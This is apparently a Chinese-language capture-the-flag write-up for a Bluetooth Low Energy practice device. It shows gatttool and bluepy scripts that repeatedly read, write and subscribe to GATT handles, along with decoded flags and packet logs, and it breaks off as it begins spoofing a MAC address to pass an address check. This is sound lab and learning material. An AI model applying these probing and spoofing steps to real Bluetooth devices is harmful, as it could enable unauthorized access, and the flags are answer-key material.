---start_time=$(date +%s)completed_reads=0error_occurred=falseecho &quot;Starting to read handle $HANDLE from $MAC, $COUNT times...&quot;echo &quot;(Using gatttool in a loop - this will be VERY SLOW and potentially unstable)&quot;echo &quot;Max duration set to $MAX_DURATION_SECONDS seconds.&quot;# --- 主循环 ---for (( i=1; i&lt;=COUNT; i++ )); do    # --- 检查总执行时间 ---    current_time=$(date +%s)    elapsed_time=$((current_time - start_time))    if [ &quot;$elapsed_time&quot; -gt &quot;$MAX_DURATION_SECONDS&quot; ]; then        echo -e &quot;\\nError: Execution time exceeded $&#123;MAX_DURATION_SECONDS&#125; seconds. Stopping.&quot;        error_occurred=true        break # 超时则跳出循环    fi    # 打印进度 (每 10 次打印一次)    if (( i % 10 == 0 )) || [ &quot;$i&quot; -eq &quot;$COUNT&quot; ]; then       printf &quot;\\rReading %d/%d (Elapsed: %ds)...&quot; &quot;$i&quot; &quot;$COUNT&quot; &quot;$elapsed_time&quot;    fi    # --- 执行命令并捕获输出 ---    # 捕获标准输出，错误输出丢弃（或重定向到日志文件）    output=$(gatttool -b &quot;$MAC&quot; --char-read -a &quot;$HANDLE&quot; -t &quot;$READ_TIMEOUT&quot; 2&gt;/dev/null | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p)    exit_code=$? # 获取管道中最后一个命令(xxd)的退出码？这不一定可靠，最好检查gatttool本身    # 更可靠地检查 gatttool 是否成功连接并读取    # 运行 gatttool 并检查其退出码，忽略解码管道的退出码    gatttool_output=$(gatttool -b &quot;$MAC&quot; --char-read -a &quot;$HANDLE&quot; -t &quot;$READ_TIMEOUT&quot; 2&gt;&amp;1)    gatttool_exit_code=$?    if [ $gatttool_exit_code -ne 0 ]; then        # 如果 gatttool 命令本身失败        echo -e &quot;\\nError: gatttool failed on read #$i (Exit code: $gatttool_exit_code). Stopping.&quot;        echo &quot;       gatttool output: $gatttool_output&quot;        error_occurred=true        break # 遇到错误停止    else        # gatttool 成功，解码输出        decoded_output=$(echo &quot;$gatttool_output&quot; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p)        # --- 存储结果 ---        # 将结果添加到数组末尾        last_results+=(&quot;$decoded_output&quot;)        # 如果数组超长，移除第一个元素        if [ $&#123;#last_results[@]&#125; -gt $LAST_N ]; then            last_results=(&quot;$&#123;last_results[@]:1&#125;&quot;) # Bash 4+ 语法移除第一个元素        fi        completed_reads=$i    fi    # (可选) 短暂暂停    # sleep 0.01    # 添加 Ctrl+C 中断处理    trap &quot;echo -e &#x27;\\nRead sequence interrupted by user.&#x27;; exit 1&quot; INTdoneecho # 结束进度条打印，换行# --- 打印最终结果 ---current_time=$(date +%s)elapsed_time=$((current_time - start_time))echo &quot;-----------------------------------------&quot;echo &quot;Finished.&quot;echo &quot;Total execution time: $&#123;elapsed_time&#125; seconds.&quot;echo &quot;Completed reads: $&#123;completed_reads&#125;/$&#123;COUNT&#125;.&quot;if [ &quot;$error_occurred&quot; = true ]; then    echo &quot;Operation stopped due to error or timeout.&quot;    exit 1elif [ &quot;$completed_reads&quot; -lt &quot;$COUNT&quot; ]; then     echo &quot;Operation stopped before completing all reads (likely interrupted).&quot;     exit 1else    echo &quot;Operation completed $COUNT reads.&quot;    echo &quot;\\nLast $LAST_N read values:&quot;    # 打印存储的最后 N 个结果    count_to_print=$&#123;#last_results[@]&#125; # 获取实际存储的数量    if [ $count_to_print -gt 0 ]; then        start_print_index=$((COUNT - count_to_print + 1))         # 使用 printf 格式化输出        for k in &quot;$&#123;!last_results[@]&#125;&quot;; do # 遍历数组索引            original_index=$((start_print_index + k))            printf &quot;  Read #%d: %s\\n&quot; &quot;$original_index&quot; &quot;$&#123;last_results[$k]&#125;&quot;        done    else        echo &quot;  No results were successfully stored.&quot;    fi    echo &quot;-----------------------------------------&quot;    exit 0 # 成功退出fi\n成功，但是用了更多的多的时间\n┌──(kali㉿kali)-[~/Desktop]└─$ ./test4.shStarting to read handle 0x003e from 64:B7:08:61:B9:7E, 1000 times...(Using gatttool in a loop - this will be VERY SLOW and potentially unstable)Max duration set to 180 seconds.Reading 1000/1000 (Elapsed: 161s)...-----------------------------------------Finished.Total execution time: 161 seconds.Completed reads: 1000/1000.Operation completed 1000 reads.\\nLast 10 read values:  Read #991: 6ffcd214ffebdc0d069e  Read #992: 6ffcd214ffebdc0d069e  Read #993: 6ffcd214ffebdc0d069e  Read #994: 6ffcd214ffebdc0d069e  Read #995: 6ffcd214ffebdc0d069e  Read #996: 6ffcd214ffebdc0d069e  Read #997: 6ffcd214ffebdc0d069e  Read #998: 6ffcd214ffebdc0d069e  Read #999: 6ffcd214ffebdc0d069e  Read #1000: 6ffcd214ffebdc0d069e\n进行验证\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;6ffcd214ffebdc0d069e&quot;|xxd -ps)Characteristic value was written successfully┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Score:10 /20\n\nbluepy使用bluepy会更快\n# -*- coding: utf-8 -*-import sysimport timefrom bluepy import btlefrom datetime import datetime, timedelta# --- 配置 ---DEVICE_ADDRESS = &quot;64:B7:08:61:B9:7E&quot;      # 目标设备 MAC 地址ADDR_TYPE = btle.ADDR_TYPE_PUBLIC       # 地址类型TARGET_HANDLE = 0x003e                  # 要重复读取的句柄READ_COUNT = 1000                       # 要读取的次数LAST_N_RESULTS = 10                    # 存储并打印最后多少个结果MAX_DURATION_SECONDS = 180              # 最大执行时间（秒），3分钟RECONNECT_DELAY = 2                     # 尝试重连前的等待时间（秒）# --- 用于存储和检测变化的变量 ---results = []                # 存储最后 N 个结果previous_value = None       # 存储上一次读取的值change_detected_at = None   # 记录第一次发生变化的读取次数value_after_change = None   # 记录变化后的第一个值operation_successful = False # 标记操作是否未出错完成print(f&quot;Target: &#123;DEVICE_ADDRESS&#125;&quot;)print(f&quot;Handle to read repeatedly: &#123;hex(TARGET_HANDLE)&#125;&quot;)print(f&quot;Number of reads required: &#123;READ_COUNT&#125;&quot;)print(f&quot;Maximum execution time: &#123;MAX_DURATION_SECONDS&#125; seconds&quot;)print(f&quot;Will store and print last &#123;LAST_N_RESULTS&#125; results.&quot;)print(f&quot;Will report first detected value change.&quot;)conn = Nonestart_time = datetime.now() # 记录开始时间try:    print(&quot;Connecting...&quot;)    conn = btle.Peripheral(DEVICE_ADDRESS, ADDR_TYPE)    print(&quot;Connected.&quot;)    # --- 重复读取循环 ---    for i in range(1, READ_COUNT + 1):        current_time = datetime.now()        elapsed_seconds = int((current_time - start_time).total_seconds()) # 计算已用时间（整数秒）        # --- 打印进度和已用时间 ---        # 使用 \\r 实现行内更新，flush=True 确保立即显示        print(f&quot;\\rReading &#123;i&#125;/&#123;READ_COUNT&#125; (Elapsed: &#123;elapsed_seconds&#125;s)...&quot;, end=&#x27;&#x27;, flush=True)        # --- 检查总执行时间 ---        if elapsed_seconds &gt; MAX_DURATION_SECONDS:            print(f&quot;\\nError: Execution time exceeded &#123;MAX_DURATION_SECONDS&#125; seconds. Stopping.&quot;)            break # 超时则跳出循环        try:            # --- 执行读取操作 ---            current_value = conn.readCharacteristic(TARGET_HANDLE)            results.append(current_value) # 添加到结果列表            # 保持结果列表最多为 LAST_N_RESULTS 个            if len(results) &gt; LAST_N_RESULTS:                results.pop(0) # 移除最早的一个            # --- 检测值是否改变 (仅在第一次改变时记录) ---            if previous_value is not None and current_value != previous_value and change_detected_at is None:                change_detected_at = i                value_after_change = current_value                # 发现变化时立即打印信息，并换行以保留进度条的最后状态                print(f&quot;\\n*** Value change detected at read #&#123;i&#125;! ***&quot;)                print(f&quot;    Previous value (read #&#123;i-1&#125;): &#123;previous_value!r&#125;&quot;)                print(f&quot;    New value (read #&#123;i&#125;):      &#123;value_after_change!r&#125;&quot;)            # 更新上一个值，用于下一次比较            previous_value = current_value        except btle.BTLEException as e:            # --- 处理读取错误 ---            print(f&quot;\\nError during read #&#123;i&#125;: &#123;e&#125;&quot;)            connection_lost = False            try:                conn.getState()                if conn.getState() != &quot;conn&quot;: connection_lost = True            except Exception: connection_lost = True            if connection_lost:                print(&quot;Connection lost. Aborting script.&quot;)                break            else:                print(&quot;An error occurred, but connection seems stable. Aborting script.&quot;)                break        except Exception as e:             print(f&quot;\\nAn unexpected non-Bluetooth error occurred during read #&#123;i&#125;: &#123;e&#125;&quot;)             break        # 可以在这里加入非常小的暂停，如果需要的话        # time.sleep(0.01)    else: # for 循环正常结束 (没有 break)        print() # 结束进度打印，换行        if len(results) &gt;= READ_COUNT % LAST_N_RESULTS or READ_COUNT &lt;= LAST_N_RESULTS : # 检查是否真的完成了所有读取             print(f&quot;\\nSuccessfully completed &#123;READ_COUNT&#125; reads.&quot;)             operation_successful = Trueexcept btle.BTLEDisconnectError as e:    print(f&quot;\\nError: Disconnected during operation: &#123;e&#125;&quot;)except btle.BTLEException as e:    print(f&quot;\\nError: Bluetooth connection or operation failed: &#123;e&#125;&quot;)except KeyboardInterrupt:    print(&quot;\\nOperation cancelled by user.&quot;)except Exception as e:    print(f&quot;\\nAn unexpected error occurred: &#123;e&#125;&quot;)finally:    # --- 清理：确保断开连接 ---    if conn:        try:            print(&quot;Disconnecting...&quot;)            conn.disconnect()        except btle.BTLEException:            pass    # --- 最终报告 ---    end_time = datetime.now()    duration = end_time - start_time    print(f&quot;\\nTotal execution time: &#123;duration&#125;&quot;)    # 报告变化检测结果    print(&quot;-&quot; * 40)    if change_detected_at is not None:        print(f&quot;Value change detected at read number: &#123;change_detected_at&#125;&quot;)        print(f&quot;Value after change was: &#123;value_after_change!r&#125;&quot;)    else:        print(&quot;No value change detected during the reads.&quot;)    print(&quot;-&quot; * 40)    if operation_successful:        print(&quot;Operation finished within time limit and without critical errors.&quot;)        # 打印最后 N 个结果        print(f&quot;\\nLast &#123;len(results)&#125; read values (up to &#123;LAST_N_RESULTS&#125;):&quot;)        start_print_index = max(1, READ_COUNT - len(results) + 1) # 计算起始索引        for k, val in enumerate(results):            original_index = start_print_index + k            print(f&quot;  Read #&#123;original_index&#125;: &#123;val.hex()&#125; (&#123;val!r&#125;)&quot;)        print(&quot;-&quot; * 40)        sys.exit(0) # 成功退出    else:        print(&quot;Operation did not complete successfully or timed out.&quot;)        # 如果有部分结果，也打印出来        if results:             print(f&quot;\\nLast &#123;len(results)&#125; read values before stopping:&quot;)             start_print_index = max(1, i - len(results) + 1) # i 是停止时的循环次数             for k, val in enumerate(results):                original_index = start_print_index + k                print(f&quot;  Read #&#123;original_index&#125;: &#123;val.hex()&#125; (&#123;val!r&#125;)&quot;)        print(&quot;-&quot; * 40)        sys.exit(1) # 失败退出\n更快\n┌──(kali㉿kali)-[~/Desktop]└─$ sudo python test5.pyTarget: 64:B7:08:61:B9:7EHandle to read repeatedly: 0x3eNumber of reads required: 1000Maximum execution time: 180 secondsWill store and print last 10 results.Will report first detected value change.Connecting...Connected.Reading 1000/1000 (Elapsed: 80s)...Successfully completed 1000 reads.Disconnecting...Total execution time: 0:01:20.515156\n同样成功\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x003e | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;6ffcd214ffebdc0d069e\n\n0x11 订阅gatt notify%% 查看 handle 0x0040 和 google search gatt 通知。gatttool 等一些工具能够订阅 gatt 通知 %%读取要求\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0040 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;\nListen to me for a single notification\n\nNotifications are unsolicited PDUs of type ATT_HANDLE_VALUE_NTF that are sent by a server to a client. No reply PDU is defined.  通知是由服务器发送到客户端的 ATT_HANDLE_VALUE_NTF 类型的未经请求的 PDU。未定义应答 PDU。\n\n指示和通知是可以通过 attribute（ATT） 协议发送的命令。因此，在 ATT 层定义了两个角色：客户端和服务器。指示和通知是 GATT 客户端订阅 GATT 服务器提供的数据的一种方式。客户端必须通过其客户端特征配置描述符为特征的值配置 Indications 和 Notifications，以便在每次在服务器上更新特征的值时收到通知。指示Indications需要由客户确认。服务器在从客户端获取回知之前不会发送以下指示。客户端向服务器发送了一条确认消息;这样 Server 就知道消息到达了 Client。因此，通过指示进行通信的速度较慢。通知Notifications不需要确认，因此速度更快。因此，服务器不知道消息是否到达客户端。\n检查notify设置┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --characteristics   handle = 0x003f, char properties = 0x1a, char value handle = 0x0040, uuid = 0000ff0c-0000-1000-8000-00805f9b34fb\n\n句柄0x003f是该特征的声明句柄（Characteristic Declaration）\n句柄0x0040是该特征的值句柄（Characteristic Value）\n客户端通过句柄0x0040进行读写和订阅通知\nuuid为自定义uuid\n\n\n特征属性位掩码 (Characteristic Properties Bitfield):\n\n\n\n\n属性\n十六进制值\n二进制位\n说明\n\n\n\nBroadcast\n0x01\n0000 0001\n广播\n\n\nRead\n0x02\n0000 0010\n允许读取\n\n\nWrite Without Resp\n0x04\n0000 0100\n允许无响应写入\n\n\nWrite\n0x08\n0000 1000\n允许带响应写入\n\n\nNotify\n0x10\n0001 0000\n允许通知\n\n\nIndicate\n0x20\n0010 0000\n允许指示\n\n\nAuthenticated Write\n0x40\n0100 0000\n认证写入\n\n\nExtended Properties\n0x80\n1000 0000\n扩展属性\n\n\n\n解码 0x1a:\n我们将十六进制值 0x1a 转换为二进制：0001 1010。\n现在我们按位检查：\nBit 0 (值 0x01): …0 - Broadcast 未设置。\nBit 1 (值 0x02): …1. - Read 设置。 (0x1a &amp; 0x02 &#x3D; 0x02 !&#x3D; 0)\nBit 2 (值 0x04): ..0. - Write Without Response 未设置。\nBit 3 (值 0x08): .1.. - Write 设置。 (0x1a &amp; 0x08 &#x3D; 0x08 !&#x3D; 0\nBit 4 (值 0x10): 1… - Notify 设置。 (0x1a &amp; 0x10 &#x3D; 0x10 !&#x3D; 0)\n\n\n结论: 因此，属性值 0x1a 表示该特征支持 Read、Write (Write Request) 和 Notify 操作\n\n\n\n测试目标句柄0x0040┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0040 -n 01 --listenCharacteristic value was written successfullyNotification handle = 0x0040 value: 35 65 63 33 37 37 32 62 63 64 30 30 63 66 30 36 64 38 65 62 ^C   ┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0040 -n 02 --listenCharacteristic value was written successfullyNotification handle = 0x0040 value: 35 65 63 33 37 37 32 62 63 64 30 30 63 66 30 36 64 38 65 62┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0041 -n 0100 --listenCharacteristic Write Request failed: Attribute can&#x27;t be written^C┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0041 -n 00 --listen Characteristic Write Request failed: Attribute can&#x27;t be written^C#注意--listen的用法#如果什么也不做只是listen是listen不到的┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E   --listen Usage:  gatttool [OPTION?]Help Options:  -h, --help                                Show help options  --help-all                                Show all help options  --help-gatt                               Show all GATT commands  --help-params                             Show all Primary Services/Characteristics arguments  --help-char-read-write                    Show all Characteristics Value/Descriptor Read/Write argumentsApplication Options:  -i, --adapter=hciX                        Specify local adapter interface  -b, --device=MAC                          Specify remote Bluetooth address  -t, --addr-type=[public | random]         Set LE address type. Default: public  -m, --mtu=MTU                             Specify the MTU size  -p, --psm=PSM                             Specify the PSM for GATT/ATT over BR/EDR  -l, --sec-level=[low | medium | high]     Set security level. Default: low  -I, --interactive                         Use interactive mode\n\n\n分析Notify (通知): 是特征的一种属性 (Property)。如果一个特征具有 Notify 属性，意味着服务器 (Peripheral，例如 BLECTF 设备) 可以在其值发生改变时，主动地、无需客户端请求地将新值发送给已订阅该通知的**客户端 (Central，例如你的 Kali 机器)**。向句柄0x0040写入任何值都会触发通知，这个通知就是目标字符\nchar notify_data[20] = &quot;5ec3772bcd00cf06d8eb&quot;; // 这是要发送的通知数据// 将句柄 0x0040 的值重置回初始指令esp_ble_gatts_set_attr_value(blectf_handle_table[IDX_CHAR_FLAG_NOTIFICATION]+1, sizeof(notification_read_value)-1, (uint8_t *)notification_read_value);// 发送通知，通知的句柄是特征值句柄，通知的数据是 notify_dataesp_ble_gatts_send_indicate(gatts_if, param-&gt;write.conn_id, blectf_handle_table[IDX_CHAR_VAL_FLAG_NOTIFICATION], sizeof(notify_data), (uint8_t *)notify_data, false); // false 表示是 Notification 而不是 Indication\n\n这是收到的日志\ngatttool[176501]: &lt; ACL Data TX: Handle 70 flags 0x00 dlen 8                                        #213 [hci0] 3098.759446      ATT: Write Request (0x12) len 3        Handle: 0x0040          Data[1]: 02&gt; HCI Event: Number of Completed Packets (0x13) plen 5                                              #214 [hci0] 3098.799759        Num handles: 1        Handle: 70 Address: 64:B7:08:61:B9:7E (Espressif Inc.)        Count: 1        #213: len 8 (1 Kb/s)        Latency: 40 msec (40-40 msec ~40 msec)&gt; ACL Data RX: Handle 70 flags 0x02 dlen 5                                                          #215 [hci0] 3098.843632      ATT: Write Response (0x13) len 0&gt; ACL Data RX: Handle 70 flags 0x02 dlen 27                                                         #216 [hci0] 3098.843644      ATT: Handle Value Notification (0x1b) len 22        Handle: 0x0040          Data[20]: 3565633337373262636430306366303664386562\n\n\n\n\n[!NOTE]在这里留一个疑问，当我在现实中遇到了蓝牙设备我会来确认这点的“ 这个结论仅适用于这个特定设备和句柄 0x0040，因为它的行为是由其独特的源代码逻辑决定的。对于其他标准的 BLE 设备或其他特征，你仍然需要遵循写入 CCCD 来启用通知的标准流程。”&gt; \n\n0x12 查看gatt indicate%% 查看 handle 0x0042 和 google search gatt indicate。对于单个响应指示消息，例如此挑战，gatttool 等工具将正常工作。 %%读取要求\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0042 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;\nListen to handle 0x0044 for a single indication参照0x11来听就可以了\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0042 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;Listen to handle 0x0044 for a single indication┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0044 -n 02 --listenCharacteristic value was written successfullyIndication   handle = 0x0044 value: 63 37 62 38 36 64 64 31 32 31 38 34 38 63 37 37 63 31 31 33 ^C\n\n在源码能直接核对答案了\nif (strcmp(writeData,&quot;c7b86dd121848c77c113&quot;) == 0)&#123;                        //indicate                        flag_state[11] = &#x27;T&#x27;;                    &#125;\n\n作为一个 indication，客户端（kali)应该返回一个回应这个过程才算是完成了，但是这里我们只需要接受信息（题目要求只需要听）这是它相关的日志\ngatttool[174176]: &lt; ACL Data TX: Handle 71 flags 0x00 dlen 8                                        #190 [hci0] 2811.800923      ATT: Write Request (0x12) len 3        Handle: 0x0044          Data[1]: 02&gt; HCI Event: Number of Completed Packets (0x13) plen 5                                              #191 [hci0] 2811.840726        Num handles: 1        Handle: 71 Address: 64:B7:08:61:B9:7E (Espressif Inc.)        Count: 1        #190: len 8 (1 Kb/s)        Latency: 39 msec (39-39 msec ~39 msec)&gt; ACL Data RX: Handle 71 flags 0x02 dlen 5                                                          #192 [hci0] 2811.887299      ATT: Write Response (0x13) len 0&gt; ACL Data RX: Handle 71 flags 0x02 dlen 27                                                         #193 [hci0] 2811.887312      ATT: Handle Value Indication (0x1d) len 22        Handle: 0x0044          Data[20]: 6337623836646431323138343863373763313133gatttool[174176]: &lt; ACL Data TX: Handle 71 flags 0x00 dlen 5                                        #194 [hci0] 2811.887499      ATT: Handle Value Confirmation (0x1e) len 0&gt; HCI Event: Number of Completed Packets (0x13) plen 5                                              #195 [hci0] 2811.927611        Num handles: 1        Handle: 71 Address: 64:B7:08:61:B9:7E (Espressif Inc.)        Count: 1        #194: len 5 (1 Kb/s)        Latency: 40 msec (39-40 msec ~39 msec)\n这是对日志的解释，它自动处理了“客户端的确认”\n\ngatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0044 -n 02 --listen: 这是你执行的命令，向蓝牙地址为64:B7:08:61:B9:7E的设备句柄0x0044写入0x02，并监听响应。\nACL Data TX: Handle 71 ... ATT: Write Request (0x12) len 3 ... Handle: 0x0044 Data[1]: 02: gatttool发送了一个ATT Write Request，句柄是0x0044，写入的数据是0x02。 Handle 71 指的是客户端与服务器之间连接的句柄。\nHCI Event: Number of Completed Packets (0x13) ... Handle: 71 ... Count: 1: HCI事件表明之前发送的数据包已经成功传输。\nACL Data RX: Handle 71 ... ATT: Write Response (0x13) len 0: 服务器发送了一个ATT Write Response，表示成功接收到写入请求。\nACL Data RX: Handle 71 ... ATT: Handle Value Indication (0x1d) len 22 ... Handle: 0x0044 Data: 6337623836646431323138343863373763313133: 关键的一行！服务器发送了一个ATT Handle Value Indication。\nHandle: 0x0044：表明Indication是针对句柄0x0044的。\nData: 6337623836646431323138343863373763313133：这是Indication携带的数据，总共20个字节，内容是6337623836646431323138343863373763313133。\n\n\nACL Data TX: Handle 71 ... ATT: Handle Value Confirmation (0x1e) len 0: gatttool发送了一个ATT Handle Value Confirmation，表示已经接收到Indication。\n\n0x13 读取多个notify%% 查看 处理 0x0046 并按照它所说的去做。请记住，此通知 clallange 要求您收到多个回复才能完成。 %%读取要求\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0046 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;\nListen to me for multi notifications听到更多的通知\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0046 -n 02 --listenCharacteristic value was written successfullyNotification handle = 0x0046 value: 55 20 6e 6f 20 77 61 6e 74 20 74 68 69 73 20 6d 73 67 00 00 Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 \n日志是这样的\ngatttool[179010]: &lt; ACL Data TX: Handle 71 flags 0x00 dlen 8                                        #294 [hci0] 3401.231380      ATT: Write Request (0x12) len 3        Handle: 0x0046          Data[1]: 02&gt; HCI Event: Command Status (0x0f) plen 4                                                           #295 [hci0] 3401.232129      NOP (0x00|0x0000) ncmd 1        Status: Success (0x00)&gt; HCI Event: Number of Completed Packets (0x13) plen 5                                              #296 [hci0] 3401.271124        Num handles: 1        Handle: 71 Address: 64:B7:08:61:B9:7E (Espressif Inc.)        Count: 1        #294: len 8 (1 Kb/s)        Latency: 39 msec (39-39 msec ~39 msec)&gt; HCI Event: LE Meta Event (0x3e) plen 12                                                           #297 [hci0] 3401.310917      LE Read Remote Used Features (0x04)        Status: Success (0x00)        Handle: 71 Address: 64:B7:08:61:B9:7E (Espressif Inc.)        Features: 0xff 0x00 0x00 0x00 0x00 0x00 0x00 0x00          LE Encryption          Connection Parameter Request Procedure          Extended Reject Indication          Peripheral-initiated Features Exchange          LE Ping          LE Data Packet Length Extension          LL Privacy          Extended Scanner Filter Policies&gt; ACL Data RX: Handle 71 flags 0x02 dlen 5                                                          #298 [hci0] 3401.315294      ATT: Write Response (0x13) len 0&gt; ACL Data RX: Handle 71 flags 0x02 dlen 27                                                         #299 [hci0] 3401.315301      ATT: Handle Value Notification (0x1b) len 22        Handle: 0x0046          Data[20]: 55206e6f2077616e742074686973206d73670000&gt; ACL Data RX: Handle 71 flags 0x02 dlen 27                                                         #300 [hci0] 3402.315328      ATT: Handle Value Notification (0x1b) len 22        Handle: 0x0046          Data[20]: 6339343537646535666438636166653334396664&gt; ACL Data RX: Handle 71 flags 0x02 dlen 27                                                         #301 [hci0] 3403.315400      ATT: Handle Value Notification (0x1b) len 22        Handle: 0x0046          Data[20]: 6339343537646535666438636166653334396664&gt; ACL Data RX: Handle 71 flags 0x02 dlen 27                                                         #302 [hci0] 3404.315311      ATT: Handle Value Notification (0x1b) len 22        Handle: 0x0046          Data[20]: 6339343537646535666438636166653334396664\n\n收到通知后等待一下就可以了，它会自动发送剩下的通知对其63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 解码后得到c9457de5fd8cafe349fd\n0x14 读取多个indicate%% 查看 handle 0x0042 和 google search gatt 指示。请记住，此 chalange 将要求您解析多个 indicate 响应才能完成 chalange。 %%读取要求注意，这里写错了，不是0x0042,是0x0048\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0048 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;\nListen to handle 0x004a for multi indications依旧是等待一会就可以了\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0048 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;Listen to handle 0x004a for multi indications┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x004a -n 02 --listenCharacteristic value was written successfullyIndication   handle = 0x004a value: 55 20 6e 6f 20 77 61 6e 74 20 74 68 69 73 20 6d 73 67 00 00 Indication   handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 Indication   handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 Indication   handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 \n对应的日志\ngatttool[183635]: &lt; ACL Data TX: Handle 71 flags 0x00 dlen 8                                        #481 [hci0] 3972.157187      ATT: Write Request (0x12) len 3        Handle: 0x004a          Data[1]: 02&gt; HCI Event: Number of Completed Packets (0x13) plen 5                                              #482 [hci0] 3972.196904        Num handles: 1        Handle: 71 Address: 64:B7:08:61:B9:7E (Espressif Inc.)        Count: 1        #481: len 8 (1 Kb/s)        Latency: 39 msec (39-39 msec ~39 msec)&gt; ACL Data RX: Handle 71 flags 0x02 dlen 5                                                          #483 [hci0] 3972.243389      ATT: Write Response (0x13) len 0&gt; ACL Data RX: Handle 71 flags 0x02 dlen 27                                                         #484 [hci0] 3972.243405      ATT: Handle Value Indication (0x1d) len 22        Handle: 0x004a          Data[20]: 55206e6f2077616e742074686973206d73670000gatttool[183635]: &lt; ACL Data TX: Handle 71 flags 0x00 dlen 5                                        #485 [hci0] 3972.244208      ATT: Handle Value Confirmation (0x1e) len 0&gt; HCI Event: Number of Completed Packets (0x13) plen 5                                              #486 [hci0] 3972.276942        Num handles: 1        Handle: 71 Address: 64:B7:08:61:B9:7E (Espressif Inc.)        Count: 1        #485: len 5 (1 Kb/s)        Latency: 32 msec (32-39 msec ~36 msec)&gt; ACL Data RX: Handle 71 flags 0x02 dlen 27                                                         #487 [hci0] 3972.323414      ATT: Handle Value Indication (0x1d) len 22        Handle: 0x004a          Data[20]: 6236663361343766323037643338653136666661gatttool[183635]: &lt; ACL Data TX: Handle 71 flags 0x00 dlen 5                                        #488 [hci0] 3972.323538      ATT: Handle Value Confirmation (0x1e) len 0&gt; HCI Event: Number of Completed Packets (0x13) plen 5                                              #489 [hci0] 3972.356801        Num handles: 1        Handle: 71 Address: 64:B7:08:61:B9:7E (Espressif Inc.)        Count: 1        #488: len 5 (1 Kb/s)        Latency: 33 msec (32-39 msec ~34 msec)&gt; ACL Data RX: Handle 71 flags 0x02 dlen 27                                                         #490 [hci0] 3972.411338      ATT: Handle Value Indication (0x1d) len 22        Handle: 0x004a          Data[20]: 6236663361343766323037643338653136666661\n\n\n\n解码得到\n62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 ┌──(kali㉿kali)-[~/Desktop]└─$ echo &quot;6236663361343766323037643338653136666661&quot; | xxd -r -p b6f3a47f207d38e16ffa                                                                                    \n\n0x15 修改蓝牙mac地址%% 查看 处理 0x004c 并按照它所说的去做。与以太网或 wifi 设备非常相似，您也可以更改蓝牙设备的 mac 地址。 %%读取要求\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x004c | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;\nConnect with BT MAC address 11:22:33:44:55:66当有设备连接时，它会检查连接过来的设备的 MAC 地址。只有当连接设备的 MAC 地址正好是 11:22:33:44:55:66 时，它才会认为这个连接是“特殊”的或“授权”的，并触发某个成功的状态（例如，更新某个特征的值，像源代码里处理 MAC 地址匹配的部分）。\n这是我自己当前的蓝牙地址\n┌──(kali㉿kali)-[~/Desktop]└─$ hciconfig        hci0:   Type: Primary  Bus: USB        BD Address: 